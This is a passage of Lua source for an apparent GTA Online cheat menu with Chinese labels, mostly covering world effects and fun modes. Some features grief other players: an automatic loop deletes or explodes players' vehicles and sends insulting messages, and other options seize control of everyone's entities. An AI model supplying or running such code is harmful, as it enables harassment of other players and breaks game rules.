                break
            end
        end
    end
    if not was_spectating then
        NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(false, target_ped)
    end
    return vehicle
end
function control_vehicle(pid, callback, opts)
    local vehicle = get_player_vehicle_in_control(pid, opts)
    if vehicle > 0 then
        callback(vehicle)
    elseif opts == nil or opts.silent ~= true then
        _lang.toast("PLAYER_OUT_OF_RANGE")
    end
end
function notify(msg)
    util.toast(msg)
end
function ExplodeThem(pos)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, false, true, 0.0, false)
end
function is_player_friend(pId)
    local pHandle = memory.alloc(104)
    NETWORK.NETWORK_HANDLE_FROM_PLAYER(pId, pHandle, 13)
    local isFriend = NETWORK.NETWORK_IS_HANDLE_VALID(pHandle, 13) and NETWORK.NETWORK_IS_FRIEND(pHandle)
    return isFriend
end
function oppKarma()
    while oppressorKarma do
        for i, pid in pairs(players.list(true, true, true)) do
            if not oppressorFriendKarma and is_player_friend(pid) then
                pid = pid+1
            elseif not oppressorYourselfKarma and pid == players.user() then
                pid = pid+1
            end
            local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            if PED.IS_PED_IN_MODEL(target_ped, 2069146067) then
                if selectedKarmaMK2 == "[Remove]" or selectedKarmaMK2 == nil then
                    control_vehicle(pid, function(vehicle)
                        entities.delete_by_handle(vehicle)
                        util.yield(100)
                    end)
                elseif selectedKarmaMK2 == "[Kill]" then
                    ExplodeThem(ENTITY.GET_ENTITY_COORDS(target_ped))
                elseif selectedKarmaMK2 == "[Remove + Kill]" then
                    control_vehicle(pid, function(vehicle)
                        entities.delete_by_handle(vehicle)
                    end)
                    util.yield(100)
                    ExplodeThem(ENTITY.GET_ENTITY_COORDS(target_ped))
                elseif selectedKarmaMK2 == "[Remove + Send SMS]" then
                    control_vehicle(pid, function(vehicle)
                        entities.delete_by_handle(vehicle)
                    end)
                    players.send_sms(pid,"你就歌姬霸！.")
                end
                notify("检测到马克兔 "..players.get_name(pid).." 报应启用")
            end
            util.yield(10)
        end
        util.yield(2000)
    end
end

menu.divider(world, "世界战局")
Blackhole = menu.list(world, "黑洞", {}, "加载黑洞", function(); end)
Load_Blackhole = menu.action(Blackhole, "加载黑洞选项", {""}, "", function()
        notification("正在加载黑洞脚本,请稍等",colors.red)
        util.yield(2000)
        require "lib.cqcqlib.Blackhole"
        menu.delete(Load_Blackhole)
    end)
local num = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29",
    "30",
    "31",
    "32",
    "33",
    "34",
    "35"
}
local ufo = util.joaat("sum_prop_dufocore_01a")
local dufo = util.joaat("imp_prop_ship_01a")
local function request_control_of_table_once(tbl)
    for index, entity in ipairs(tbl) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
        end
        end
        local toast = util.toast
        local format = string.format
        local function toast_formatted(str, ...)
            toast(format(str, ...))
        end
        island_block = 0
menu.action(world, "天空岛", {""}, "", function(on_click)
    local c = {}
    c.x = 0
    c.y = 0
    c.z = 500
    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), c.x, c.y, c.z+5)
    if island_block == 0 or not ENTITY.DOES_ENTITY_EXIST(island_block) then
        request_model_load(1054678467)
        island_block = entities.create_object(1054678467, c)
    end
end)

        menu.toggle_loop(world, "跳跳车", {}, '使附近的车辆全都跳起来！！！', function(toggle)
            local entities = GET_NEARBY_VEHICLES(PLAYER.PLAYER_ID(), 150)
            for _, vehicle in ipairs(entities) do
                REQUEST_CONTROL(vehicle)
                ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0, 0, 6.5, 0, 0, 0, 0, false, false, true)
            end
            util.yield(1500)
        end)
        meteors = false
        menu.toggle(world, "满天星", {""}, "", function(on)
            if on then
                meteors = true
                start_meteor_shower()
            else
                meteors = false
            end
        end, false)
        


menu.toggle_loop(world,"轰炸区", {"bowlingshower"}, "", function()
    local hash = util.joaat("imp_prop_bomb_ball")
    request_model_load(hash)
    if active_bowling_balls <= 15 then 
        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), math.random(-200, 200), math.random(-200, 200), math.random(100, 300))
        local ball = entities.create_object(hash, c)
        ENTITY.FREEZE_ENTITY_POSITION(ball, false)
        ENTITY.SET_ENTITY_DYNAMIC(ball, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(ball, 1, math.random(-300, 300), math.random(-300, 300), -300, 0, 0, 0, 0, true, false, true, true, true)
        bomb_shower_tick_handler(ball)
    end
    util.yield(500)
end)

menu.toggle_loop(world, "混沌车辆", {}, "使附近的汽车进入混沌模式。可能会让其他玩家非常讨厌。建议与朋友一起使用，以免破坏他人的乐趣",
    function()
        for i, veh in ipairs(entities.get_all_vehicles_as_handles()) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, 0.0, 10.0, 0.0, true, true, true, true) -- alternatively, VEHICLE.SET_VEHICLE_FORWARD_SPEED(...) -- not tested
        end
    end
)
menu.toggle(world, "洛城暴乱", {}, "开启后，周围的npc会进入无差别攻击模式！", function(toggle)
    MISC.SET_RIOT_MODE_ENABLED(toggle)
end)

menu.toggle_loop(world, "闪电生成", {""}, "", function()
    MISC.FORCE_LIGHTNING_FLASH()
end)
menu.toggle_loop(world, "定点轰炸", {"pointbombing"}, "标点指定轰炸", function ()--=====heezy
    local waypointPos = get_waypoint_v3()
    if waypointPos then
        local hash = util.joaat('w_arena_airmissile_01a')
        loadModel(hash)

        waypointPos.z += 30
        local bomb = entities.create_object(hash, waypointPos)
        waypointPos.z -= 30
        ENTITY.SET_ENTITY_ROTATION(bomb, -90, 0, 0,  2, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, 0, 0, 0, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)

        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
            util.yield_once()
        end
        entities.delete_by_handle(bomb)
        executeNuke(waypointPos)
    end
end)
menu.toggle(world, "陨落的飞机", {},"经典之作", function(on)
    angry_planes = on
    start_angryplanes_thread()
end)
menu.toggle_loop(world, "UFO勇闯洛城", {}, "在你的周围随机生成UFO", function(toggle)
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local r = num[math.random(#num)]
    c.x = math.random(0.0,1.0) >= 0.5 and c.x + r + 5 or c.x - r - 5 --set x coords
    c.y = math.random(0.0,1.0) >= 0.5 and c.y + r + 5 or c.y - r - 5 --set y coords
    c.z = c.z + r + 8 --set z coords
    STREAMING.REQUEST_MODEL(ufo)
    while not STREAMING.HAS_MODEL_LOADED(ufo) do
        STREAMING.REQUEST_MODEL(ufo)
        util.yield()
    end
    util.yield(2500)
    local spawnedufo = entities.create_object(ufo, c) --spawn ufo
    util.yield(500)
    local ufoc = ENTITY.GET_ENTITY_COORDS(spawnedufo) --get ufo pos
    local success, floorcoords
    repeat
        success, floorcoords = util.get_ground_z(ufoc.x, ufoc.y) --get floor pos
        util.yield()
    until success
    FIRE.ADD_EXPLOSION(ufoc.x, ufoc.y, floorcoords, exp, 100.0, true, false, 1.0, false) --explode at floor
    util.yield(1500)
    entities.delete_by_handle(spawnedufo) --delete ufo

    if not STREAMING.HAS_MODEL_LOADED(ufo) then
        util.toast("无法加载模型")
    end
end)


local bigasscircle = util.joaat("ar_prop_ar_neon_gate4x_04a")
local c1
local c2
local c3
local c4
local c5
local c6
local c7
local c8
local c9
local c10
local c12
local c13
local c14
local c15
local c16
local c17
local c18
local c19
menu.action(world, "生成巨型圆球", {}, "在银行楼顶生成一个巨大的圆球", function()
    STREAMING.REQUEST_MODEL(bigasscircle)
    while not STREAMING.HAS_MODEL_LOADED(bigasscircle) do
        STREAMING.REQUEST_MODEL(bigasscircle)
        util.yield()
    end
    c1 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751)) --why tables when ctrl + c, ctrl + v
    c2 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c3 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c4 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c5 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c6 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c7 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c8 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c9 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c10 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c11 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c12 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c13 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c14 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c15 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c16 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c17 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c18 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c19 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    ENTITY.FREEZE_ENTITY_POSITION(c1, true)
    ENTITY.FREEZE_ENTITY_POSITION(c2, true)
    ENTITY.FREEZE_ENTITY_POSITION(c3, true)
    ENTITY.FREEZE_ENTITY_POSITION(c4, true)
    ENTITY.FREEZE_ENTITY_POSITION(c5, true)
    ENTITY.FREEZE_ENTITY_POSITION(c6, true)
    ENTITY.FREEZE_ENTITY_POSITION(c7, true)
    ENTITY.FREEZE_ENTITY_POSITION(c8, true)
    ENTITY.FREEZE_ENTITY_POSITION(c9, true)
    ENTITY.FREEZE_ENTITY_POSITION(c10, true)
    ENTITY.FREEZE_ENTITY_POSITION(c11, true)
    ENTITY.FREEZE_ENTITY_POSITION(c12, true)
    ENTITY.FREEZE_ENTITY_POSITION(c13, true)
    ENTITY.FREEZE_ENTITY_POSITION(c14, true)
    ENTITY.FREEZE_ENTITY_POSITION(c15, true)
    ENTITY.FREEZE_ENTITY_POSITION(c16, true)
    ENTITY.FREEZE_ENTITY_POSITION(c17, true)
    ENTITY.FREEZE_ENTITY_POSITION(c18, true)
    ENTITY.FREEZE_ENTITY_POSITION(c19, true)
    ENTITY.SET_ENTITY_ROTATION(c2, 0.0, 0.0, 10.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c3, 0.0, 0.0, 20.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c4, 0.0, 0.0, 30.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c5, 0.0, 0.0, 40.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c6, 0.0, 0.0, 50.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c7, 0.0, 0.0, 60.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c8, 0.0, 0.0, 70.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c9, 0.0, 0.0, 80.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c10, 0.0, 0.0, 90.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c11, 0.0, 0.0, 100.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c12, 0.0, 0.0, 110.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c13, 0.0, 0.0, 120.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c14, 0.0, 0.0, 130.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c15, 0.0, 0.0, 140.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c16, 0.0, 0.0, 150.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c18, 0.0, 0.0, 160.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c19, 0.0, 0.0, 170.0, 1, true)
    ENTITY.SET_ENTITY_COORDS(players.user_ped(), -75.14637, -818.67236, 326.1751)
end)

menu.action(world, "删除巨型圆球", {}, "", function()
    entities.delete_by_handle(c1)
    entities.delete_by_handle(c2)
    entities.delete_by_handle(c3)
    entities.delete_by_handle(c4)
    entities.delete_by_handle(c5)
    entities.delete_by_handle(c6)
    entities.delete_by_handle(c7)
    entities.delete_by_handle(c8)
    entities.delete_by_handle(c9)
    entities.delete_by_handle(c10)
    entities.delete_by_handle(c11)
    entities.delete_by_handle(c12)
    entities.delete_by_handle(c13)
    entities.delete_by_handle(c14)
    entities.delete_by_handle(c15)
    entities.delete_by_handle(c16)
    entities.delete_by_handle(c17)
    entities.delete_by_handle(c18)
    entities.delete_by_handle(c19)
end)
local train_root = menu.list(world, "列车选项", {"traincontrol"})
menu.action(train_root,"寻找列车", {}, "", function()
    for _, veh in pairs(entities.get_all_vehicles_as_pointers()) do 
        if entities.get_model_hash(veh) == util.joaat("freight") then
            local c = entities.get_position(veh)
            ENTITY.SET_ENTITY_COORDS(players.user_ped(), c.x, c.y, c.z)
            return 
        end
    end
    util.toast("没有发现列车")
end)

menu.click_slider(train_root,"设置列车速度", {}, "", -300, 300, 10, 1, function(s)
    local train_hdl = 0
    local was_any_train_affected = false
    for _, veh in pairs(entities.get_all_vehicles_as_pointers()) do 
        if entities.get_model_hash(veh) == util.joaat("freight") then
            train_hdl = entities.pointer_to_handle(veh)
            request_control_of_entity(train_hdl)
            VEHICLE.SET_TRAIN_SPEED(train_hdl, s)
            VEHICLE.SET_TRAIN_CRUISE_SPEED(train_hdl, s)
            was_any_train_affected = true
        end
    end
    if not was_any_train_affected then
        util.toast("没有发现列车")
    end
end)
Tingdian = menu.list(world, "关闭电闸", {}, "", function(); end)
menu.toggle(Tingdian, "世界停电", {"poweroutage"}, "如果世界停电你会干什么？~", function(toggled)
    GRAPHICS.SET_ARTIFICIAL_LIGHTS_STATE(toggled)
end)
menu.toggle(Tingdian, "原始停电", {"blackout"}, "灰蒙蒙的一片", function(toggled)
    menu.trigger_commands("time 1")
    GRAPHICS.SET_ARTIFICIAL_LIGHTS_STATE(toggled)
    if toggled then
        GRAPHICS.SET_TIMECYCLE_MODIFIER("dlc_island_vault")
    else
        GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
    end
end)
local gravity_current_index
menu.list_select(world, "世界重力", {"worldgravity"},
"改变世界的重力。此选项最适合使用相同模式的其他CqCqScript用户。对其他玩家来说可能真的很烦人/很糟糕（掌控一切）。建议只在朋友周围使用，以免破坏其他人的乐趣",
{
    {"默认",     {"default"}, ""},
    {"标准",         {"low"},     ""},
    {"非常低",    {"verylow"}, ""},
    {"无重力",  {"none"},    ""},
}, 1,
function(option_index, menu_name, previous_option, click_type)
    gravity_current_index = option_index
    if click_type ~= CLICK_BULK then  toast_formatted("将世界重力设置为%s.", string.lower(menu_name)) end
    if option_index ~= 1 then
        while gravity_current_index == option_index do
            request_control_of_table_once(entities.get_all_vehicles_as_handles())
            request_control_of_table_once(entities.get_all_objects_as_handles())
            request_control_of_table_once(entities.get_all_peds_as_handles())
            request_control_of_table_once(entities.get_all_pickups_as_handles())
            MISC.SET_GRAVITY_LEVEL(option_index - 1)
            util.yield()
        end
    else
        MISC.SET_GRAVITY_LEVEL(option_index - 1)
    end
end)
menu.divider(funfeatures, "娱乐")
happy = menu.list(funfeatures, "娱乐模式", {}, "", function(); end)
local startViewMode
local scope_scaleform
local gaveHelmet = false
menu.toggle_loop(happy, '钢铁侠', {'JSironman'}, 'Ironman！！Tips:与祖国人一起用效果更佳！', function()
    if not menu.get_value(levitationCommand) then
        menu.trigger_command(levitationCommand)
    end
    if not PED.IS_PED_WEARING_HELMET(players.user_ped()) then
        PED.GIVE_PED_HELMET(players.user_ped(), true, 4096, -1)
        gaveHelmet = true
    end
    local context = CAM._GET_CAM_ACTIVE_VIEW_MODE_CONTEXT()
    if startViewMode == nil then
        startViewMode = CAM.GET_CAM_VIEW_MODE_FOR_CONTEXT(context)
    end
    if CAM.GET_CAM_VIEW_MODE_FOR_CONTEXT(context) != 4 then
        CAM.SET_CAM_VIEW_MODE_FOR_CONTEXT(context, 4)
    end
    scope_scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE('REMOTE_SNIPER_HUD')
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scope_scaleform, 'REMOTE_SNIPER_HUD')
    GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scope_scaleform, 255, 255, 255, 255, 0)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    local barrageInput = 'INPUT_PICKUP'
    if not PAD._IS_USING_KEYBOARD(0) then
        barrageInput = 'INPUT_COVER'
    end
    memory.write_int(memory.script_global(1649593 + 1163), 1)
    SFasd.CLEAR_ALL()
    SFasd.TOGGLE_MOUSE_BUTTONS(false)
    SFasd.SET_DATA_SLOT(2, JSkey.get_control_instructional_button(0, 'INPUT_ATTACK'), '爆炸')
    SFasd.SET_DATA_SLOT(1, JSkey.get_control_instructional_button(0, 'INPUT_AIM'), '光束')
    SFasd.SET_DATA_SLOT(0, JSkey.get_control_instructional_button(0, barrageInput), '弹幕')
    SFasd.DRAW_INSTRUCTIONAL_BUTTONS()
    JSkey.disable_control_action(2, 'INPUT_VEH_MOUSE_CONTROL_OVERRIDE')
    JSkey.disable_control_action(2, 'INPUT_VEH_FLY_MOUSE_CONTROL_OVERRIDE')
    JSkey.disable_control_action(2, 'INPUT_VEH_SUB_MOUSE_CONTROL_OVERRIDE')
    JSkey.disable_control_action(0, 'INPUT_ATTACK')
    JSkey.disable_control_action(0, 'INPUT_AIM')
    if not (JSkey.is_disabled_control_pressed(0, 'INPUT_ATTACK') or JSkey.is_disabled_control_pressed(0, 'INPUT_AIM') or JSkey.is_disabled_control_pressed(0, barrageInput)) then return end
    local a = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local b = getOffsetFromCam(80)
    local hash
    if JSkey.is_disabled_control_pressed(0, 'INPUT_ATTACK') then
        hash = util.joaat('VEHICLE_WEAPON_PLAYER_LAZER')
        if not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) then
            WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 26)
            while not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) do
                util.yield()
            end
        end
    elseif JSkey.is_disabled_control_pressed(0, 'INPUT_AIM') then
        hash = util.joaat('WEAPON_RAYPISTOL')
        if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), hash, false) then
            WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 9999, false, false)
        end
    else
        hash = util.joaat('WEAPON_RPG')
        if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), hash, false) then
            WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 9999, false, false)
        end
        a.x += math.random(0, 100) / 100
        a.y += math.random(0, 100) / 100
        a.z += math.random(0, 100) / 100
    end
    WEAPON.SET_CURRENT_PED_WEAPON(players.user_ped(), util.joaat('WEAPON_UNARMED'), true)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
        a.x, a.y, a.z,
        b.x, b.y, b.z,
        200,
        true,
        hash,
        PLAYER.PLAYER_PED_ID(),
        true, true, -1.0
    )
end, function()
    if gaveHelmet then
        PED.REMOVE_PED_HELMET(players.user_ped(), true)
        gaveHelmet = false
    end
    HUD._HUD_WEAPON_WHEEL_IGNORE_CONTROL_INPUT(false)
    local pScaleform = memory.alloc_int()
    memory.write_int(pScaleform, scope_scaleform)
    GRAPHICS.SET_SCALEFORM_MOVIE_AS_NO_LONGER_NEEDED(pScaleform)
    menu.trigger_command(levitationCommand, 'off')
    util.yield()
    CAM.SET_CAM_VIEW_MODE_FOR_CONTEXT(CAM._GET_CAM_ACTIVE_VIEW_MODE_CONTEXT(), startViewMode)
    startViewMode = nil
end)
menu.toggle_loop(happy, "祖国人的激光眼", {"lasereyes"}, "按住E键！Tips:与钢铁侠一起用效果更佳！", function(on)
    laser_eyes()
end)
local entity_held = 0
local are_hands_up = false
menu.toggle_loop(happy,"举起扔出车子", {"throwcars"}, "在车辆附近按E以使用，在按住车辆以投掷时按E。", function(on)
    if PAD.IS_CONTROL_JUST_RELEASED(38, 38) then
        if entity_held == 0 then
            if not are_hands_up then 
                local closest = get_closest_veh(ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                local veh = closest[1]
                local dist = closest[2]
                if dist <= 5 then 
                    request_anim_dict("missminuteman_1ig_2")
                    TASK.TASK_PLAY_ANIM(players.user_ped(), "missminuteman_1ig_2", "handsup_enter", 8.0, 0.0, -1, 50, 0, false, false, false)
                    util.yield(500)
                    are_hands_up = true
                    ENTITY.SET_ENTITY_ALPHA(veh, 100)
                    ENTITY.SET_ENTITY_HEADING(veh, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(veh, players.user_ped(), 0, 0, 0, get_model_size(ENTITY.GET_ENTITY_MODEL(veh)).z / 2, 180, 180, -180, true, false, true, false, 0, true)
                    entity_held = veh
                end 
            else
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                are_hands_up = false
            end
        else
            if ENTITY.IS_ENTITY_A_VEHICLE(entity_held) then
                ENTITY.DETACH_ENTITY(entity_held)
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(entity_held, 100.0)
                VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(entity_held, true, true)
                ENTITY.SET_ENTITY_ALPHA(entity_held, 255)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(entity_held, players.user_ped(), false)
                request_anim_dict("melee@unarmed@streamed_core")
                TASK.TASK_PLAY_ANIM(players.user_ped(), "melee@unarmed@streamed_core", "heavy_punch_a", 8.0, 8.0, -1, 0, 0.3, false, false, false)
                util.yield(500)
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
                entity_held = 0
                are_hands_up = false
            end
            -- toss
        end
    end
end)
local ped_held = 0
menu.toggle_loop(happy,"举起丢掉npc", {"throwpeds"}, "举起来并扔掉npc。在npc附近按E使用，按住npc时按E仍 很好玩！.", function(on)
    if PAD.IS_CONTROL_JUST_RELEASED(38, 38) then
        if entity_held == 0 then
            if not are_hands_up then 
                local closest = get_closest_ped(ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                local ped = closest[1]
                local dist = closest[2]
                if dist <= 5 then 
                    request_anim_dict("missminuteman_1ig_2")
                    TASK.TASK_PLAY_ANIM(players.user_ped(), "missminuteman_1ig_2", "handsup_enter", 8.0, 0.0, -1, 50, 0, false, false, false)
                    util.yield(500)
                    are_hands_up = true
                    ENTITY.SET_ENTITY_ALPHA(ped, 100)
                    ENTITY.SET_ENTITY_HEADING(ped, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, players.user_ped(), 0, 0, 0, 1.3, 180, 180, -180, true, false, true, true, 0, true)
                    entity_held = ped
                end 
            else
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                are_hands_up = false
            end
        else
            if ENTITY.IS_ENTITY_A_PED(entity_held) then
                ENTITY.DETACH_ENTITY(entity_held)
                ENTITY.SET_ENTITY_ALPHA(entity_held, 255)
                PED.SET_PED_TO_RAGDOLL(entity_held, 10, 10, 0, false, false, false)
                --ENTITY.SET_ENTITY_VELOCITY(entity_held, 0, 100, 0)
                ENTITY.SET_ENTITY_MAX_SPEED(entity_held, 100.0)
                ENTITY.APPLY_FORCE_TO_ENTITY(entity_held, 1, 0, 100, 0, 0, 0, 0, 0, true, false, true, false, false)
                AUDIO.PLAY_PAIN(entity_held, 7, 0, 0)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(entity_held, players.user_ped(), false)
                request_anim_dict("melee@unarmed@streamed_core")
                TASK.TASK_PLAY_ANIM(players.user_ped(), "melee@unarmed@streamed_core", "heavy_punch_a", 8.0, 8.0, -1, 0, 0.3, false, false, false)
                util.yield(500)
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
                entity_held = 0
                are_hands_up = false
            end
            -- toss
        end
    end
end)


weaponback = off
menu.toggle(happy, "背藏武器", {}, "按Tab键--感谢heezy", function(on)--=========感谢heezy
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
	weaponback = on
	if weaponback then
		spawnweapon = 0
	end
	curweap = CCCC_HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())
	if not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == -1569615261) and weaponback then
		spawnweapon = WEAPON.CREATE_WEAPON_OBJECT(curweap, 1, pos.x, pos.y, pos.z, true, 1, 0)
		attachweapon(spawnweapon)
	end
	while weaponback do
		if (WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(plyped()) == 0) then
			if not (spawnweapon == 0) then
				ENTITY.SET_ENTITY_VISIBLE(spawnweapon, true, false)
			end
		else
			ENTITY.SET_ENTITY_VISIBLE(spawnweapon, false, false)
		end
		if not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == curweap) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == -1569615261) then
			if not (spawnweapon == 0) then
				entities.delete_by_handle(spawnweapon)
			end
			curweap = HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())
			requestweapon(curweap)
			spawnweapon = WEAPON.CREATE_WEAPON_OBJECT(curweap, 1, pos.x, pos.y, pos.z, true, 1, 0)
			if (WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(plyped()) == 0) then
				ENTITY.SET_ENTITY_VISIBLE(spawnweapon, true, false)
			else
				ENTITY.SET_ENTITY_VISIBLE(spawnweapon, false, false)
			end
			attachweapon(spawnweapon)
		end
		util.yield()
	end
	entities.delete_by_handle(spawnweapon)
end)
menu.toggle_loop(happy, "地毯飞行", {"carpetride"}, "", function()
    carpetridexx()
end,function()
TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
	ENTITY.DETACH_ENTITY(players.user_ped(), true, false)
	ENTITY.SET_ENTITY_VISIBLE(object, false, false)
	entities.delete_by_handle(object)
	state = 0
end)
finger_thing = menu.list(happy, "手指枪 [B键]", {}, "感谢jinx")--=========感谢jinx
shouzhiqiang()
local obj
lichangpro = menu.list(happy, "力场Pro", {}, "", function(); end)
menu.divider(lichangpro, "力场")

menu.toggle_loop(lichangpro, "力场", {"sforcefield"}, "", function()
    if players.exists(players.user()) then
        local _entities = {}
        local player_pos = players.get_position(players.user())

        for _, vehicle in pairs(entities.get_all_vehicles_as_handles()) do
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
            if v3.distance(player_pos, vehicle_pos) <= s_forcefield_range then
                table.insert(_entities, vehicle)
            end
        end
        for _, ped in pairs(entities.get_all_peds_as_handles()) do
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if (v3.distance(player_pos, ped_pos) <= s_forcefield_range) and not PED.IS_PED_A_PLAYER(ped) then
                table.insert(_entities, ped)
            end
        end
        for _, entity in pairs(_entities) do
            local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
            local entity_type = ENTITY.GET_ENTITY_TYPE(entity)

            if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and player_vehicle ~= entity then
                if entity_type == 1 then
                    PED.SET_PED_TO_RAGDOLL(entity, 500, 0, 0, false, false, false)
                end
                if s_forcefield == 1 then
                    ENTITY.APPLY_FORCE_TO_ENTITY(
                        entity, 3, 0, 0, 1, 0, 0, 0.5, 0, false, false, true, false, false
                    )
                else
                    local force = ENTITY.GET_ENTITY_COORDS(entity)
                    v3.sub(force, player_pos)
                    v3.normalise(force)

                    if s_forcefield == 2 then
                        v3.mul(force, -1)
                    end

                    ENTITY.APPLY_FORCE_TO_ENTITY(
                        entity, 3, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true, false, false
                    )
                end
            end
        end
    end
end)

local s_forcefield_direction_slider = menu.slider_text(
    lichangpro, "力场方向", {"sforcefieldirection"}, "", s_forcefield_names, function()end
)

util.create_tick_handler(function()
    if not players.exists(players.user()) then
        return false
    end

    s_forcefield = menu.get_value(s_forcefield_direction_slider)
end)

local s_forcefield_range_slider = menu.slider_float(
    lichangpro, "力场范围", {"sforcefieldrange"}, "", 100, 10000, 2000, 10, function(value)
        s_forcefield_range = value/100
end)

local s_forcefield_range_on_focus
menu.on_focus(s_forcefield_range_slider, function()
    s_forcefield_range_on_focus = true

    util.create_tick_handler(function()
        local player_pos = players.get_position(players.user())
        local red, green, blue = get_hud_colour()

        if not s_forcefield_range_on_focus then
            return false
        end

        GRAPHICS._DRAW_SPHERE(player_pos.x, player_pos.y, player_pos.z, s_forcefield_range, red, green, blue, 0.5)
